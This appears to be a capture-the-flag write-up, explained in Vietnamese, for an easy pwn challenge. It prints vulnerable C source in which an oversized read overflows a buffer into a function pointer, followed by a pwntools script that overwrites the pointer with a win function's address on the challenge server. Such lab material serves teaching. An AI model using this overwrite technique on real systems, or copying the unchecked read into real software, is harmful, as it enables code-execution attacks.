---
title: 'Cyberphobia: Overflowed Bits'
description: ''
date: '2026-11-07T12:12:52.000Z'
categories:
  - Writeup
writeup_group: CTF
tags:
  - Pwn
  - Easy
cover: ''
math: true
draft: false
author: Hân
writeup_subgroup: SpookyCTF 2026
---
# Cyberphobia: Overflowed Bits
## Challenge Description
> I can’t trust computers anymore. I trusted the input, it overflowed.
flag format is spooky{response_from_server}
## Solution
```C++
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void corn_maze_exit() {
    char secret[128];
    const char *path = "/opt/ctf/chall1/secret.txt";
    FILE *f = fopen(path, "r");

    if (!f) { 
        printf("flag.txt missing \n"); 
        return; 
    }

    fgets(secret, sizeof secret, f);

    printf("\nYou've made it out of the maze! \n");
    printf("Secret value: %s", secret);
    printf("\nWell done! Use the secret value to unlock the next part of the challenge! \n");

}

void center_of_corn_maze() {
    printf("You're still stuck in the maze, try again! \n");
}

void vuln() {
    struct {
        char buf[64];
        void (*direction)();
    } s;

    s.direction = center_of_corn_maze;              
    printf("New sign direction: ");
    read(0, s.buf, 128);           
    s.direction();
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf(
        "You're stuck in a corn maze! All the signs are pointing you deeper into the maze, \ncan you redirect the sign to help you get out to POINT you in the right direction?"
    );
    printf("\n\nYou're somewhere in the maze... \n");
    vuln();
    return 0;
}
```
Ta thấy `s.direction = center_of_corn_maze;` gán địa chỉ của hàm `center_of_corn_maze` vào `s.direction`, đây là nơi chứa con trỏ của hàm (có kích thước 8 bytes).

Vì biến `buf` chỉ chứa được `64 bytes` nhưng hàm `read` lại đọc `128 bytes`, nên ta có thể `buffer overflow` ở đây.

Ý tưởng ở đây là nhập 64 ký tự để tràn khỏi biến `buf`, sau đó nhập địa chỉ hàm `win`, ở đây là hàm `corn_maze_exit` để `void (*direction)` thay vì thực hiện hàm `center_of_corn_maze` thì sẽ thực hiện hàm `win`.

Ta thấy địa chỉ của hàm `corn_maze_exit` là `0x00000000004011d6`
![image](/images/post/2026/11/cyberphobia-overflowed-bits-1794111628318-ug4nu.png)


```Python
#!/usr/bin/env python
from pwn import *
# exe = ELF('./main')
# p = process(exe.path)
p = remote("18.226.103.146", 1337)
context.log_level = "debug"
payload = b"a" * 64 + p64(0x00000000004011d6)
p.sendafter(b'New sign direction: ', payload)
p.recvall()
p.interactive()
```
